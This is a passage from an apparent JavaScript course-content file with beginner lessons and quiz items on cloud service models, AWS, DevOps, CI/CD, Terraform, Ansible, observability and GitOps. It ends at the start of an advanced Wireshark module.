        titleEn: "Service Models: IaaS, PaaS, SaaS",
        contentEn: `Cloud computing means renting computers over the internet instead of buying them.

**Three service models:**

**IaaS (Infrastructure as a Service):**
- You rent raw servers, storage, and networks
- You manage: OS, runtime, app, data
- The cloud manages: physical hardware, power, cooling
- Example: AWS EC2, Google Compute Engine, Azure VMs
- Analogy: renting an empty apartment — you bring your own furniture

**PaaS (Platform as a Service):**
- You just deploy your code
- The cloud manages: OS, runtime, scaling, updates
- You manage: your app and its data
- Example: Heroku, AWS Elastic Beanstalk, Google App Engine
- Analogy: a hotel room — furniture included, just bring your clothes

**SaaS (Software as a Service):**
- You use a finished product
- The cloud manages everything
- Example: Gmail, Slack, Salesforce
- Analogy: going to a restaurant — just eat, no cooking

| You manage | IaaS | PaaS | SaaS |
|---|---|---|---|
| Application | Yes | Yes | No |
| Runtime | Yes | No | No |
| OS | Yes | No | No |
| Hardware | No | No | No |

**How to choose:**
- Need full control? → IaaS
- Want to focus on code? → PaaS
- Just need to use software? → SaaS`
      },
      {
        titleEn: "AWS Core Services",
        contentEn: `AWS is the largest cloud provider. These are the services you must know.

**Compute:**
- **EC2** — virtual servers (IaaS). Choose CPU, RAM, disk. You manage the OS.
- **Lambda** — serverless functions. Upload code, pay per execution. No servers to manage.

**Storage:**
- **S3** — object storage. Store files, images, backups. Very cheap, very durable (99.999999999% — "eleven nines").
- **EBS** — block storage. Like a virtual hard disk attached to an EC2 instance.

**Database:**
- **RDS** — managed relational databases (PostgreSQL, MySQL). AWS handles backups, patches, failover.
- **DynamoDB** — managed NoSQL. Very fast, scales automatically.

**Networking:**
- **VPC** — your private network in the cloud
- **Route 53** — DNS service
- **CloudFront** — CDN (content delivery network)

**The serverless shift:**
Traditional: EC2 + RDS + load balancer (you manage scaling)
Serverless: Lambda + DynamoDB + API Gateway (AWS manages scaling)

{question}
Your app gets 100 requests per day. Which is cheaper?
a) A t3.medium EC2 running 24/7 ($30/month)
b) Lambda functions ($0.0000002 per request)
c) Both cost the same

answer: b
explanation: 100 requests/day = 3,000/month. At $0.0000002 per request, that is $0.0006/month. The EC2 instance costs $30/month even when idle. Lambda wins for low-traffic apps.`
      },
      {
        titleEn: "VPC Networking",
        contentEn: `A VPC (Virtual Private Cloud) is your own private network inside AWS.

**Key components:**
- **Subnets** — slices of your network
  - Public subnet: has a route to the internet (for web servers)
  - Private subnet: no direct internet access (for databases)
- **Internet Gateway** — the door to the internet
- **NAT Gateway** — lets private resources reach the internet (for updates) without being reachable from the internet
- **Security Groups** — firewall rules per resource (allow port 443 from anywhere, allow port 5432 only from the web server)
- **Route Tables** — traffic rules (this subnet goes to the internet gateway, that subnet goes to the NAT)

**Typical architecture:**
\`\`\`
Internet
   |
Internet Gateway
   |
[Public Subnet]
  - Load Balancer
  - NAT Gateway
   |
[Private Subnet]
  - Web servers (EC2)
  - API servers
   |
[Private Subnet]
  - Database (RDS)
  - Cache (ElastiCache)
\`\`\`

**Security layers:**
1. Security Groups (instance level) — stateful firewall
2. Network ACLs (subnet level) — stateless firewall
3. Private subnets (network level) — no public IP at all

**Rule of thumb:** Put only load balancers in public subnets. Everything else goes in private subnets.`
      },
      {
        titleEn: "High Availability & Chaos Engineering",
        contentEn: `Cloud does not mean "never fails." It means "designed to survive failures."

**Multi-AZ (Availability Zones):**
- Each AWS region has 2-6 AZs
- An AZ is a separate data center (own power, cooling, network)
- Deploy your app across 2+ AZs
- If one AZ goes down, the others keep running

**Design rules:**
- Stateless servers (no data stored on the server itself)
- Database replication across AZs (RDS Multi-AZ)
- Load balancer distributes traffic to healthy instances
- Auto Scaling Group replaces failed instances

**The Netflix Chaos Monkey story:**
In 2011, Netflix moved to AWS. They asked: "What if servers randomly die?"
Instead of hoping it would not happen, they built Chaos Monkey — a tool that randomly kills production servers during business hours.

Why? Because:
- If your system survives random server deaths, it can survive real outages
- Engineers are forced to build resilient systems
- Problems are found on Tuesday at 2 PM (when everyone is awake), not Saturday at 3 AM

**Chaos Monkey rules:**
- Only runs during business hours
- Only kills one instance at a time
- The team gets alerts and can see what happened

**The result:** When AWS had a major outage in 2012, Netflix stayed up while other companies went down. Their systems were trained to survive failure.

{thinkOutside}
Your company runs a web app on 2 EC2 instances in one AZ. The CEO says "we never had downtime, why pay for Multi-AZ?"

What is wrong with this thinking? What would you say to the CEO?

Key points:
- "We never had downtime" = we were lucky, not resilient
- A single AZ failure takes down everything
- The cost of Multi-AZ is small compared to the cost of hours of downtime
- Netflix did not wait for failure — they practiced for it`
      }
    ]
  },

  205: {
    titleEn: "DevOps Philosophy & CI/CD",
    pages: [
      {
        titleEn: "What is DevOps?",
        contentEn: `DevOps is a culture change, not just a set of tools.

**The old way (before DevOps):**
- Developers write code and throw it "over the wall" to Operations
- Operations deploy it and deal with problems
- Blame game: "It works on my machine!" vs "Your code crashed the server!"
- Releases happen every few months. Each release is scary.

**The DevOps way:**
- Dev and Ops work together as one team
- "You build it, you run it" — developers are responsible for their code in production
- Releases happen many times per day. Each release is small and safe.
- Automation replaces manual work

**The CALMS framework:**
- **C**ulture — collaboration, shared responsibility, no blame
- **A**utomation — CI/CD, Infrastructure as Code, monitoring
- **L**ean — small batches, fast feedback, reduce waste
- **M**easurement — measure everything (deploy frequency, failure rate, recovery time)
- **S**haring — share knowledge, tools, and on-call duties

**Key metrics (DORA):**
- Deployment frequency → how often you release
- Lead time for changes → from commit to production
- Change failure rate → % of releases that cause problems
- Mean time to recovery (MTTR) → how fast you fix problems

**Elite teams:** deploy multiple times per day, lead time < 1 hour, failure rate < 5%, recovery < 1 hour.`
      },
      {
        titleEn: "CI/CD with GitHub Actions",
        contentEn: `CI/CD automates the path from code to production.

**CI (Continuous Integration):**
- Every push triggers automatic tests
- Catch bugs in minutes, not days
- Merge small changes often (not big merges once a month)

**CD (Continuous Delivery / Deployment):**
- Delivery: code is always ready to deploy (one-click)
- Deployment: code is automatically deployed after tests pass

**GitHub Actions example:**
\`\`\`yaml
# .github/workflows/ci.yml
name: CI Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm install
      - run: npm test
      - run: npm run lint

  deploy:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp .
      - run: docker push myapp:latest
      - run: kubectl apply -f k8s/
\`\`\`

**Key ideas:**
- **on: push** — triggers on every push
- **needs: test** — deploy only runs after tests pass
- **if: github.ref == 'refs/heads/main'** — only deploy from main branch
- Pull requests run tests but do not deploy

{question}
A developer pushes code. Tests pass but the deploy step fails. What happens?
a) The broken code goes to production
b) The code stays in the branch, production is not affected
c) GitHub reverts the commit automatically
d) All previous deployments are rolled back

answer: b
explanation: The deploy step failed, so the new code never reached production. The old version keeps running. This is the safety net of CI/CD.`
      },
      {
        titleEn: "Terraform: Infrastructure as Code",
        contentEn: `Terraform lets you define infrastructure in code files instead of clicking in a web console.

**Why IaC?**
- Reproducible: run the same code → get the same infrastructure
- Version controlled: git log shows who changed what and when
- Reviewable: infrastructure changes go through pull requests
- Fast: create 50 servers in seconds, not hours of clicking

**Terraform basics:**
\`\`\`hcl
# main.tf
provider "aws" {
  region = "us-east-1"
}

resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.micro"

  tags = {
    Name = "web-server"
  }
}

resource "aws_s3_bucket" "data" {
  bucket = "my-app-data-bucket"
}
\`\`\`

**Terraform workflow:**
1. \`terraform init\` — download provider plugins
2. \`terraform plan\` — show what will change (add, modify, destroy)
3. \`terraform apply\` — make the changes
4. \`terraform destroy\` — delete everything

**The plan step is critical.** It shows you exactly what will happen before anything changes. Like a "dry run."

**State file:**
Terraform keeps a state file (terraform.tfstate) that tracks what it created. This is how it knows what exists and what needs to change. Never edit this file by hand.`
      },
      {
        titleEn: "Ansible: Configuration Management",
        contentEn: `Terraform creates servers. Ansible configures them.

**What Ansible does:**
- Install software on 100 servers at once
- Copy config files to every server
- Restart services after a config change
- Ensure all servers are in the same state

**How it works:**
- Agentless: connects via SSH (no software to install on target servers)
- Playbooks: YAML files that describe the desired state
- Idempotent: run it 10 times, same result (safe to repeat)

**Example playbook:**
\`\`\`yaml
# setup-web.yml
- hosts: webservers
  become: yes
  tasks:
    - name: Install nginx
      apt:
        name: nginx
        state: present

    - name: Copy config file
      copy:
        src: nginx.conf
        dest: /etc/nginx/nginx.conf
      notify: restart nginx

    - name: Ensure nginx is running
      service:
        name: nginx
        state: started
        enabled: yes

  handlers:
    - name: restart nginx
      service:
        name: nginx
        state: restarted
\`\`\`

**Terraform vs Ansible:**
| | Terraform | Ansible |
|---|---|---|
| Purpose | Create infrastructure | Configure servers |
| Language | HCL | YAML |
| State | Stateful (state file) | Stateless |
| Best for | Cloud resources | Server setup |

**They work together:** Terraform creates 10 EC2 instances → Ansible installs and configures your app on all 10.

{simulation}
You need to set up a production environment:
1. Terraform creates: VPC, 3 EC2 instances, RDS database, S3 bucket
2. Ansible connects to the 3 EC2 instances and: installs Docker, pulls the app image, starts the container, configures log rotation
3. GitHub Actions runs on every push: tests → build → push image → Ansible deploys

This is the modern DevOps pipeline: IaC + Configuration Management + CI/CD.`
      }
    ]
  },

  206: {
    titleEn: "Observability Fundamentals",
    pages: [
      {
        titleEn: "The Three Pillars of Observability",
        contentEn: `Observability means understanding what your system is doing from the outside.

**Three pillars:**

**1. Metrics — numbers over time**
- CPU usage: 45% → 78% → 92%
- Request count: 1,200 per minute
- Error rate: 0.3%
- Response time: p99 = 250ms
- Metrics answer: "Is something wrong right now?"

**2. Logs — detailed event records**
- \`2024-03-15 10:23:45 ERROR: Database connection refused\`
- \`2024-03-15 10:23:46 WARN: Retrying connection (attempt 2/3)\`
- \`2024-03-15 10:23:47 INFO: Connection restored\`
- Logs answer: "What exactly happened?"

**3. Traces — follow a request across services**
- User clicks "Buy" → API gateway → auth service → order service → payment → email
- Each step has a timing: auth took 12ms, payment took 340ms
- Traces answer: "Where is the bottleneck?"

**Why all three?**
- Metric alert: "Error rate jumped to 5%"
- Logs: "Database connection timeout errors on service-B"
- Trace: "Requests that hit service-B → database take 8 seconds instead of 50ms"
- Root cause: the database server ran out of connections

One pillar alone cannot solve the puzzle. You need all three.`
      },
      {
        titleEn: "Prometheus & Grafana",
        contentEn: `Prometheus collects metrics. Grafana makes them visual.

**Prometheus:**
- Pull-based: Prometheus asks your app "what are your metrics?" every 15 seconds
- Your app exposes metrics at /metrics endpoint
- Time-series database: stores metric values over time
- Alert rules: "If error_rate > 5% for 5 minutes, alert the team"

**How apps expose metrics:**
\`\`\`
# GET /metrics
http_requests_total{method="GET", status="200"} 15234
http_requests_total{method="POST", status="500"} 12
http_request_duration_seconds{quantile="0.99"} 0.25
node_cpu_usage_percent 67.3
\`\`\`

**Grafana:**
- Connects to Prometheus (and other data sources)
- Builds dashboards with charts, graphs, and alerts
- Common panels: time series, gauge, stat, table, heatmap
- Share dashboards with the team

**A typical dashboard shows:**
- Request rate (requests per second)
- Error rate (% of 5xx responses)
- Latency (p50, p95, p99)
- CPU, memory, disk usage
- Active database connections

**The RED method (for services):**
- **R**ate — how many requests per second?
- **E**rrors — how many of those fail?
- **D**uration — how long do they take?

{question}
Prometheus scrapes metrics every 15 seconds. Your app crashes and restarts in 5 seconds. Will Prometheus notice?
a) Yes, it checks every 15 seconds so it will see the restart
b) No, the crash happened between scrapes
c) It depends on the metrics
d) Both a and b are possible

answer: d
explanation: If Prometheus scrapes right during the crash, it will see a failed scrape (target down). If the app restarts before the next scrape, Prometheus might miss it. This is why logs and traces complement metrics.`
      },
      {
        titleEn: "SLI, SLO, and SLA",
        contentEn: `These three terms define reliability in measurable ways.

**SLI (Service Level Indicator):**
- A metric that measures user experience
- Examples:
  - Request latency: p99 = 200ms
  - Availability: 99.95% of requests succeed
  - Error rate: 0.1% of requests return 5xx

**SLO (Service Level Objective):**
- Your internal target for an SLI
- "99.9% of requests will complete in under 300ms"
- "99.95% availability per month"
- This is what your team promises to achieve

**SLA (Service Level Agreement):**
- A contract with customers
- Includes consequences: "If we drop below 99.9% uptime, we give you a credit"
- SLA is always less strict than SLO (you need a safety margin)

**Example:**
- SLI: actual uptime last month = 99.97%
- SLO: internal goal = 99.95%
- SLA: contract with customers = 99.9%

**Error budget:**
- SLO = 99.9% → you can have 0.1% downtime per month
- 0.1% of 30 days = 43 minutes of allowed downtime
- If you still have error budget left → deploy new features
- If error budget is used up → freeze releases, focus on reliability

**The key insight:** 100% is not the goal. If you have zero downtime, you are probably not releasing fast enough. The error budget balances speed and reliability.`
      },
      {
        titleEn: "ELK Stack & Postmortem Culture",
        contentEn: `**ELK Stack — centralized logging:**

- **E**lasticsearch — stores and indexes logs (search engine)
- **L**ogstash — collects, transforms, and ships logs
- **K**ibana — visualize and search logs in a web UI

**How it works:**
1. Your apps write logs (stdout, files)
2. A log shipper (Filebeat) sends them to Logstash
3. Logstash parses and enriches the logs
4. Elasticsearch stores them (searchable)
5. Kibana lets you search: "show all errors from payment-service in the last hour"

**Why centralized logging?**
- 50 servers × 10 log files = 500 files to search manually
- ELK: one search bar to find any log from any server

**Postmortem culture:**
When something breaks, you write a postmortem — a document that asks:
1. **What happened?** (timeline of events)
2. **What was the impact?** (users affected, duration)
3. **Why did it happen?** (root cause, not blame)
4. **How did we detect it?** (monitoring? customer complaint?)
5. **What will we do to prevent it?** (action items with owners and deadlines)

**Rules of a good postmortem:**
- Blameless: "The deploy script had no rollback" NOT "John deployed bad code"
- Focused on systems: "How do we make this impossible?" not "Who made the mistake?"
- Shared publicly within the company → everyone learns

{thinkOutside}
Your payment service was down for 45 minutes last night. The on-call engineer fixed it by restarting the database. The CEO asks: "Who is responsible?"

How would you run a blameless postmortem?

Key approach:
- Focus on: "Why did the database need restarting? What caused the state that led to the crash?"
- Not: "Who forgot to check the database?"
- Action items: add database connection pool monitoring, add auto-restart on high connection count, improve the runbook for database issues`
      }
    ]
  },

  207: {
    titleEn: "Infrastructure as Code (Deep Dive)",
    pages: [
      {
        titleEn: "What is Infrastructure as Code?",
        contentEn: `IaC means managing servers, networks, and services through code files instead of manual clicks.

**The problem (before IaC):**
- An engineer clicks through the AWS console to create a server
- Nobody knows exactly what settings were used
- Creating a second identical server? Good luck remembering every click
- "Snowflake servers" — each one is slightly different

**The IaC solution:**
- Write code that describes your infrastructure
- Store the code in Git (version history, reviews, rollbacks)
- Run the code → infrastructure is created exactly the same every time

**Benefits:**
- **Reproducible** — dev, staging, and production are identical
- **Auditable** — git log shows every change and who made it
- **Fast** — create 100 servers in minutes
- **Self-documenting** — the code IS the documentation
- **Testable** — validate infrastructure before applying changes

**Types of IaC tools:**
| Tool | Type | Use |
|---|---|---|
| Terraform | Provisioning | Create cloud resources |
| CloudFormation | Provisioning | AWS-only, same idea |
| Ansible | Configuration | Set up software on servers |
| Pulumi | Provisioning | IaC in real programming languages |

**Key principle:** Never make changes by hand. If it is not in the code, it does not exist.`
      },
      {
        titleEn: "Terraform HCL Language",
        contentEn: `HCL (HashiCorp Configuration Language) is Terraform's language. It is declarative — you describe what you want, not how to build it.

**Core building blocks:**

**Provider** — which cloud to use:
\`\`\`hcl
provider "aws" {
  region = "us-east-1"
}
\`\`\`

**Resource** — something to create:
\`\`\`hcl
resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.micro"
  subnet_id     = aws_subnet.public.id
}
\`\`\`

**Variable** — input parameters:
\`\`\`hcl
variable "instance_count" {
  type    = number
  default = 2
}
\`\`\`

**Output** — values to show after apply:
\`\`\`hcl
output "server_ip" {
  value = aws_instance.web.public_ip
}
\`\`\`

**Data source** — read existing resources:
\`\`\`hcl
data "aws_ami" "ubuntu" {
  most_recent = true
  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-22*"]
  }
}
\`\`\`

**References:**
- \`aws_subnet.public.id\` — reference another resource's attribute
- \`var.instance_count\` — reference a variable
- \`data.aws_ami.ubuntu.id\` — reference a data source

{question}
What does \`aws_instance.web.public_ip\` mean in Terraform?
a) A hardcoded IP address
b) The public IP of the resource named "web" of type "aws_instance"
c) A variable named public_ip
d) An AWS API call

answer: b
explanation: Terraform creates a resource graph. \`aws_instance.web\` refers to the resource block, and \`.public_ip\` is an attribute that AWS returns after the instance is created.`
      },
      {
        titleEn: "Terraform State Management",
        contentEn: `State is Terraform's memory. It tracks what resources exist and their current configuration.

**What the state file contains:**
- Every resource Terraform created
- Their IDs, IPs, and settings
- The mapping between your code and the real world

**Local state (default):**
- Saved as \`terraform.tfstate\` in your project folder
- Problem: only one person can use it at a time
- Problem: if you lose the file, Terraform forgets everything

**Remote state (production):**
\`\`\`hcl
terraform {
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    dynamodb_table = "terraform-locks"
    encrypt        = true
  }
}
\`\`\`

**Why remote state?**
- **Shared access** — the whole team uses the same state
- **Locking** — DynamoDB prevents two people from changing infra at the same time
- **Encryption** — state can contain secrets (passwords, keys)
- **Backup** — S3 has versioning, so you can recover old state

**State commands:**
- \`terraform state list\` — show all tracked resources
- \`terraform state show aws_instance.web\` — show details of one resource
- \`terraform import aws_instance.web i-1234567\` — import an existing resource into state

**Golden rule:** Never edit the state file manually. Use \`terraform state\` commands or \`terraform import\`.`
      },
      {
        titleEn: "Cattle vs Pets",
        contentEn: `This is the most important mental shift in DevOps.

**Pets (the old way):**
- Each server has a name: "db-master", "web-prod-01"
- You log in to fix problems manually
- If a server dies, you panic and try to repair it
- Servers are unique and irreplaceable
- Like a pet: you name it, care for it, and cry when it is sick

**Cattle (the DevOps way):**
- Servers are numbered: instance-001, instance-002
- You never log in to fix anything — you replace the server
- If a server dies, automation creates a new one in seconds
- Servers are identical and disposable
- Like cattle: any one can be replaced by another

**How to treat servers as cattle:**
1. **IaC** — create any server from code in minutes
2. **Immutable infrastructure** — never update a server, deploy a new one
3. **Configuration management** — Ansible ensures all servers are identical
4. **Auto Scaling** — automatically add or remove servers
5. **Health checks** — kill unhealthy servers, create healthy ones

**Story: The Production Database Server**
A company had one database server called "Big Bertha." It ran for 4 years. Nobody dared restart it. Nobody knew exactly how it was configured. When it finally crashed, recovery took 3 days.

After the incident, they:
- Automated the database setup with Terraform + Ansible
- Set up RDS Multi-AZ (managed database with auto-failover)
- Tested failover every month

Now their database is cattle. If it dies, AWS creates a new one in 60 seconds.

{thinkOutside}
Look at your own projects. Which of your servers or services are "pets"? How would you turn them into "cattle"?

Think about:
- Can you recreate the server from scratch in under 10 minutes?
- Is every configuration step documented in code?
- Would you be comfortable if someone deleted the server right now?`
      }
    ]
  },

  208: {
    titleEn: "Monitoring & Observability (Deep Dive)",
    pages: [
      {
        titleEn: "The Metrics-Logs-Traces Triangle",
        contentEn: `Each pillar of observability serves a different purpose in debugging.

**Metrics — the alert system**
- Aggregate numbers: averages, percentiles, counts
- Cheap to store (just numbers over time)
- Good for: dashboards, alerts, capacity planning
- Weakness: tells you THAT something is wrong, not WHY

**Logs — the detail system**
- Text records of events with timestamps
- Expensive to store (text is large)
- Good for: debugging specific errors, audit trails
- Weakness: hard to see patterns across millions of log lines

**Traces — the flow system**
- Follow one request across multiple services
- Medium cost to store
- Good for: finding slow services, understanding dependencies
- Weakness: sampling needed at high traffic (you cannot trace every request)

**How they work together (incident example):**

| Step | Pillar | Action |
|---|---|---|
| 1 | Metric | Alert: "p99 latency > 2 seconds" |
| 2 | Trace | Look at slow traces → payment-service takes 1.8s |
| 3 | Logs | Read payment-service logs → "Connection pool exhausted" |
| 4 | Metric | Check connection pool metric → maxed out at 20/20 |
| Root cause | — | Connection pool too small for current traffic |
| Fix | — | Increase pool size from 20 to 50 |

**Key tools:**
- Metrics: Prometheus, Datadog, CloudWatch
- Logs: ELK Stack, Loki, Splunk
- Traces: Jaeger, Zipkin, Tempo
- All-in-one: Datadog, New Relic, Grafana Cloud`
      },
      {
        titleEn: "PromQL Query Language",
        contentEn: `PromQL is the query language for Prometheus. It lets you ask questions about your metrics.

**Basic queries:**
\`\`\`promql
# Current value of a metric
http_requests_total

# Filter by label
http_requests_total{status="500"}

# Filter by multiple labels
http_requests_total{method="POST", status="500"}
\`\`\`

**Rate — the most important function:**
\`\`\`promql
# Requests per second over the last 5 minutes
rate(http_requests_total[5m])

# Error rate (errors / total requests)
rate(http_requests_total{status="500"}[5m])
  / rate(http_requests_total[5m])
\`\`\`

**Aggregation:**
\`\`\`promql
# Total requests per second across all instances
sum(rate(http_requests_total[5m]))

# Requests per second, grouped by status code
sum by (status) (rate(http_requests_total[5m]))

# Average CPU across all pods
avg(container_cpu_usage_seconds_total)
\`\`\`

**Percentiles:**
\`\`\`promql
# 99th percentile latency
histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))
\`\`\`

**Alert rule example:**
\`\`\`yaml
- alert: HighErrorRate
  expr: rate(http_requests_total{status="500"}[5m]) > 0.05
  for: 5m
  labels:
    severity: critical
  annotations:
    summary: "Error rate above 5% for 5 minutes"
\`\`\`

{question}
What does \`rate(http_requests_total[5m])\` measure?
a) The total number of HTTP requests ever made
b) The number of requests in the last 5 minutes
c) The average requests per second over the last 5 minutes
d) The maximum request count in 5 minutes

answer: c
explanation: \`rate()\` calculates the per-second average rate of increase over the given time window. A [5m] window means it looks at the last 5 minutes of data to compute a smooth per-second rate.`
      },
      {
        titleEn: "Grafana Dashboards",
        contentEn: `Grafana turns metrics into visual dashboards that anyone can understand.

**Dashboard design principles:**
- Top row: key business metrics (revenue, active users)
- Second row: system health (error rate, latency, uptime)
- Lower rows: detailed infrastructure (CPU, memory, disk, network)
- Use colors: green = healthy, yellow = warning, red = critical

**Common panel types:**
- **Time series** — metrics over time (request rate, CPU usage)
- **Stat** — single big number (current error rate: 0.2%)
- **Gauge** — progress bar (disk usage: 73%)
- **Table** — list of data (top 10 slowest endpoints)
- **Heatmap** — density over time (request latency distribution)
- **Alert list** — currently firing alerts

**The USE method (for infrastructure):**
- **U**tilization — how full is the resource? (CPU at 85%)
- **S**aturation — is there a queue? (10 requests waiting)
- **E**rrors — any failures? (disk I/O errors)

**Dashboard variables:**
Use dropdown filters to make dashboards flexible:
- Environment: dev / staging / production
- Service: api / web / worker
- Time range: last 1h / 6h / 24h / 7d

**Best practices:**
- Every team should have a "service overview" dashboard
- Link alerts to the relevant dashboard
- Include runbook links: "If this alert fires, follow these steps"
- Review dashboards monthly — remove panels nobody looks at`
      },
      {
        titleEn: "Story: The Memory Leak",
        contentEn: `**The setup:**
A team launched a new microservice. Everything looked fine on day one.

**Day 1:** Memory usage: 200 MB. No alerts. All green.

**Day 3:** Memory usage: 600 MB. Still under the 1 GB limit. Nobody noticed.

**Day 5:** Memory usage: 950 MB. Prometheus alert fires: "memory usage > 90%."
The on-call engineer sees the alert but restarts the service. Memory drops to 200 MB. Problem "solved."

**Day 7:** Memory hits 1 GB again. The service crashes. Kubernetes restarts it. But during the 30-second restart, 200 requests fail.

**Day 8 — the real investigation:**
The team opens Grafana and looks at the memory panel over 7 days. They see a clear pattern: memory grows by ~100 MB per day and never goes down.

This is a memory leak — the code allocates memory but never frees it.

**Finding the root cause:**
1. Grafana showed memory growing linearly (not spiky → leak, not load)
2. Logs showed no errors (the leak was silent)
3. A trace showed that every request to /api/reports created a cache entry that was never cleaned up
4. The fix: add cache expiration (TTL of 1 hour)

**Lessons learned:**
- Restarting a service hides the problem, it does not fix it
- Memory graphs over days/weeks reveal leaks that short time windows miss
- Every cache must have an expiration policy
- The postmortem led to a new alert: "If memory grows > 10% per day for 3 days, alert"

{simulation}
You see this pattern in Grafana:
- CPU: flat at 30% (no issue)
- Memory: 200 MB → 400 MB → 600 MB → 800 MB over 4 days
- Request rate: constant at 100 req/s (no traffic change)
- Error rate: 0% (no errors yet)

What is happening? What would you do?

Steps:
1. The linear memory growth with constant traffic = memory leak
2. Do not restart — that hides the problem
3. Add memory profiling to the service
4. Check for: unclosed connections, growing caches, event listeners not removed
5. Fix the code, deploy, and watch the memory graph flatten`
      }
    ]
  },

  209: {
    titleEn: "GitOps",
    pages: [
      {
        titleEn: "Git as the Source of Truth",
        contentEn: `GitOps is a way of managing infrastructure and deployments where Git is the single source of truth.

**The core idea:**
- The desired state of your system is stored in a Git repository
- Any change to the system goes through a Git commit
- An automated tool watches the repo and makes reality match the repo

**Traditional deployment:**
1. Developer pushes code
2. CI builds an image
3. Someone runs \`kubectl apply\` manually (or CI does it)
4. Problem: what is actually running in production? You have to check the cluster.

**GitOps deployment:**
1. Developer pushes code
2. CI builds an image and updates the image tag in the Git repo
3. A GitOps tool (ArgoCD) detects the change and syncs the cluster
4. What is running in production? Check the Git repo. It is always accurate.

**Benefits:**
- **Audit trail** — every change is a git commit with author, timestamp, and message
- **Easy rollback** — revert a commit → system rolls back automatically
- **Security** — developers never need direct access to the cluster
- **Consistency** — Git is the truth, not what someone typed in a terminal
- **Pull-based** — the cluster pulls changes from Git (safer than pushing to the cluster)

**GitOps principles:**
1. The entire system is described declaratively (YAML)
2. The desired state is stored in Git
3. Changes are applied automatically after approval
4. Software agents ensure the actual state matches the desired state`
      },
      {
        titleEn: "ArgoCD: The GitOps Loop",
        contentEn: `ArgoCD is the most popular GitOps tool for Kubernetes.

**How ArgoCD works (the loop):**

\`\`\`
[Git Repository]
    |
    | (1) ArgoCD watches for changes
    v
[ArgoCD Server]
    |
    | (2) Compares: Git state vs Cluster state
    v
[Kubernetes Cluster]
    |
    | (3) If different → sync (apply changes)
    | (4) If same → do nothing
    |
    └──→ (5) Report status back to ArgoCD UI
\`\`\`

**Key concepts:**
- **Application** — an ArgoCD resource that links a Git repo to a K8s namespace
- **Sync** — the act of making the cluster match Git
- **Health status** — is the app running correctly?
- **Sync status** — does the cluster match Git?

**Sync statuses:**
- **Synced** — cluster matches Git (all good)
- **OutOfSync** — cluster does not match Git (a change is pending)
- **Unknown** — ArgoCD cannot determine the state

**Auto-sync vs manual sync:**
- Auto-sync: ArgoCD applies changes immediately when Git changes
- Manual sync: ArgoCD detects the diff but waits for human approval
- Best practice: auto-sync for dev/staging, manual sync for production

{question}
A developer pushes a new image tag to the GitOps repo. ArgoCD shows "OutOfSync." What does this mean?
a) The deployment failed
b) The Git repo has changes that are not yet applied to the cluster
c) The cluster has changes that are not in Git
d) ArgoCD is broken

answer: b
explanation: "OutOfSync" means the desired state (Git) is different from the actual state (cluster). ArgoCD detected the new image tag in Git but has not applied it yet. If auto-sync is on, it will apply shortly. If manual, someone needs to click "Sync."`
      },
      {
        titleEn: "Drift Detection",
        contentEn: `Drift happens when the actual state of your system does not match the desired state in Git.

**How drift happens:**
- Someone runs \`kubectl edit deployment\` directly on the cluster
- A script changes a config outside of the GitOps process
- A cloud resource is modified through the web console
- An automated process (like HPA) changes replica counts

**Why drift is dangerous:**
- You think production has version 2.3 (because Git says so)
- But someone manually deployed version 2.4 last night
- Now your rollback goes to 2.3, skipping unknown changes in 2.4
- Debugging becomes impossible: "It works in Git but not in production"

**How ArgoCD detects drift:**
1. ArgoCD reads the desired state from Git
2. ArgoCD reads the actual state from the K8s API
3. It compares them field by field
4. Any difference = drift → status becomes "OutOfSync"
5. ArgoCD can show you a visual diff (like git diff)

**Handling drift:**
- **Auto-heal (self-heal):** ArgoCD automatically reverts manual changes
- **Alert:** notify the team that someone made a manual change
- **Ignore:** some fields (like replica count from HPA) should be excluded from drift detection

**Best practice: enable self-heal.**
If someone makes a manual change, ArgoCD reverts it within seconds. This enforces the rule: all changes must go through Git. No exceptions.

{thinkOutside}
Your team has self-heal enabled. A senior engineer manually scales a deployment from 3 to 10 replicas during a traffic spike. ArgoCD reverts it to 3 within seconds.

Was ArgoCD right to revert it? How should the engineer handle this situation properly?

The correct approach:
- The engineer should update the Git repo (change replicas to 10, or adjust HPA settings)
- Push the commit → ArgoCD syncs → replicas go to 10
- This takes 2-3 minutes but maintains the GitOps process
- For emergencies: some teams exclude replica count from drift detection and let HPA manage it
- Alternative: have an "emergency override" process that commits to Git automatically`
      }
    ]
  },

  // ========== RESEARCH TRACK (301-308) ==========
  301: {
    titleEn: "Advanced Wireshark",
    pages: [
      {
        titleEn: "TCP State Machine — Reading the Wire",
        contentEn: `Every TCP connection goes through **states**. Wireshark shows them all.

**TCP State Machine (simplified):**
- **CLOSED** → SYN sent → **SYN_SENT**
- SYN+ACK received → **ESTABLISHED**
- FIN sent → **FIN_WAIT_1** → ACK → **FIN_WAIT_2** → FIN → **TIME_WAIT**
- Other side: FIN received → **CLOSE_WAIT** → FIN sent → **LAST_ACK** → CLOSED

**What to look for in Wireshark:**
- **[TCP Retransmission]** — a packet was lost, sender tries again
- **[TCP Dup ACK]** — receiver says "I got packet 5, but I'm still waiting for packet 3"
- **[TCP Window Full]** — receiver's buffer is full, sender must stop
- **[TCP Zero Window]** — receiver says "stop sending, I need time"

**CWND (Congestion Window) analysis:**
- CWND = how many bytes the sender can send before waiting for ACK
- Starts small (Slow Start), grows fast (doubles each RTT)
- Packet loss → CWND drops to half (Congestion Avoidance)
- Wireshark → Statistics → TCP Stream Graphs → Window Scaling

**Key filters:**
- \`tcp.analysis.retransmission\` — show only retransmissions
- \`tcp.analysis.duplicate_ack\` — show duplicate ACKs
- \`tcp.analysis.zero_window\` — show zero window events
- \`tcp.time_delta > 0.5\` — show packets with > 500ms delay`
      },
      {
        titleEn: "Retransmissions, RTT, and Performance",
        contentEn: `**Retransmissions kill performance.** Here's why:

**Types of retransmission:**
- **Fast Retransmit** — 3 duplicate ACKs trigger immediate resend (good, fast recovery)
